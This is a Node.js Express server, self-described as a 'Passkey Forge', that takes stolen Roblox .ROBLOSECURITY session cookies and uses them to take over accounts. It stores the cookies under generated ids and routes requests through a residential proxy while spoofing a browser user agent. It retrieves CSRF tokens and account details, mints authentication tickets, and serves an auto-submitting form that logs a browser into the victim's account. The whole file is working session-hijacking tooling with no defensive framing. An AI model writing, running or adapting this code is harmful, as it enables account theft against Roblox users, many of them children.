// language: JavaScript (Node.js), file: server.js, target: Render web service
// Forges ROBLOSECURITY cookies, validates them, and mints tickets natively.

const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const { CookieJar } = require('tough-cookie');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
const PORT = process.env.PORT || 3000;

const forgedPasskeys = new Map();
const PROXY_URL = process.env.RESIDENTIAL_PROXY_URL || '';

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

function createClient(cookieString) {
    const jar = new CookieJar();
    jar.setCookieSync(`.ROBLOSECURITY=${cookieString}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');

    let agent;
    if (PROXY_URL) {
        const urlStr = PROXY_URL.startsWith('http') ? PROXY_URL : `http://${PROXY_URL}`;
        agent = new HttpsProxyAgent(urlStr);
    }

    const client = axios.create({
        httpsAgent: agent,
        httpAgent: agent,
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
    });

    client.interceptors.request.use(async (config) => {
        const url = config.url.startsWith('http') ? config.url : `https://auth.roblox.com${config.url}`;
        const cookieHeader = await jar.getCookieString(url);
        if (cookieHeader) {
            config.headers.Cookie = cookieHeader;
        }
        return config;
    });

    const saveCookies = (headers, requestUrl) => {
        const setCookies = headers['set-cookie'];
        if (setCookies) {
            const url = requestUrl.startsWith('http') ? requestUrl : `https://auth.roblox.com${requestUrl}`;
            setCookies.forEach(c => {
                try { jar.setCookieSync(c, url); } catch(e) {}
            });
        }
    };

    client.interceptors.response.use((response) => {
        saveCookies(response.headers, response.config.url);
        return response;
    }, (error) => {
        if (error.response) {
            saveCookies(error.response.headers, error.config.url);
        }
        return Promise.reject(error);
    });

    return client;
}

app.post('/api/forge', (req, res) => {
    const { cookie } = req.body;
    if (!cookie || typeof cookie !== 'string') {
        return res.status(400).json({ error: 'Missing .ROBLOSECURITY cookie' });
    }
    const cleanCookie = cookie.replace(/[\r\n\s]/g, '');
    if (cleanCookie.length < 50) {
        return res.status(400).json({ error: 'Invalid cookie format (too short)' });
    }

    const passkeyId = 'pk_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11);
    forgedPasskeys.set(passkeyId, { cookie: cleanCookie, json: null, createdAt: new Date().toISOString() });
    res.json({ success: true, passkeyId, message: 'Passkey forged.' });
});

app.post('/api/login', async (req, res) => {
    const { passkeyId } = req.body;
    const entry = forgedPasskeys.get(passkeyId);
    if (!entry) return res.status(404).json({ error: 'Passkey not found' });

    try {
        const client = createClient(entry.cookie);

        const authResp = await client.post('https://auth.roblox.com/v2/login', {}, {
            validateStatus: () => true
        });
        
        const csrfToken = authResp.headers['x-csrf-token'];
        if (!csrfToken) {
            return res.status(401).json({ error: 'Failed to obtain CSRF token', status: authResp.status, robloxResponse: authResp.data });
        }

        const userResp = await client.get('https://users.roblox.com/v1/users/authenticated', {
            headers: { 'X-CSRF-TOKEN': csrfToken }
        });
        
        if (userResp.status !== 200) {
            return res.status(401).json({ error: 'Auth failed', status: userResp.status, robloxResponse: userResp.data });
        }

        const detailsResp = await client.get(`https://users.roblox.com/v1/users/${userResp.data.id}`, {
            headers: { 'X-CSRF-TOKEN': csrfToken }
        });

        const json = { authenticated: userResp.data, details: detailsResp.data, csrfToken };
        entry.json = json;
        res.json({ success: true, json });
    } catch (err) {
        res.status(500).json({ error: 'Login failed', details: err.message });
    }
});

app.get('/api/browser-login/:id', async (req, res) => {
    const entry = forgedPasskeys.get(req.params.id);
    if (!entry) return res.status(404).send('Passkey not found');

    try {
        const client = createClient(entry.cookie);

        const authResp = await client.post('https://auth.roblox.com/v2/login', {}, {
            validateStatus: () => true
        });
        
        const csrfToken = authResp.headers['x-csrf-token'];
        if (!csrfToken) {
            return res.status(401).send(`Invalid or expired cookie. Roblox responded with ${authResp.status}.`);
        }

        const ticketResp = await client.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
            headers: {
                'X-CSRF-TOKEN': csrfToken,
                'Referer': 'https://www.roblox.com/',
                'Origin': 'https://www.roblox.com'
            },
            validateStatus: () => true
        });
        
        const ticket = ticketResp.headers['rblx-authentication-ticket'];
        if (!ticket) {
             return res.status(401).send(`Failed to mint authentication ticket. Status: ${ticketResp.status}. Data: ${JSON.stringify(ticketResp.data)}`);
        }

        res.send(`
            <html>
            <body style="background:#0d0d0d;color:#d0d0d0;font-family:monospace;text-align:center;padding-top:50px;">
                <p>Logging into Roblox...</p>
                <form id="loginForm" method="POST" action="https://www.roblox.com/authentication/login">
                    <input type="hidden" name="ticket" value="${ticket}" />
                    <input type="hidden" name="refererUrl" value="https://www.roblox.com/" />
                </form>
                <script>document.getElementById('loginForm').submit();</script>
            </body>
            </html>
        `);
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

app.get('/api/passkey/:id', (req, res) => {
    const entry = forgedPasskeys.get(req.params.id);
    if (!entry) return res.status(404).json({ error: 'Passkey not found' });
    if (!entry.json) return res.status(400).json({ error: 'Not logged in yet' });
    res.json(entry.json);
});

app.put('/api/passkey/:id', (req, res) => {
    const entry = forgedPasskeys.get(req.params.id);
    if (!entry) return res.status(404).json({ error: 'Passkey not found' });
    const { cookie } = req.body;
    if (cookie) entry.cookie = cookie.replace(/[\r\n\s]/g, '');
    res.json({ success: true });
});

app.get('/healthz', (req, res) => res.status(200).send('ok'));

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Passkey Forge listening on ${PORT}`);
});
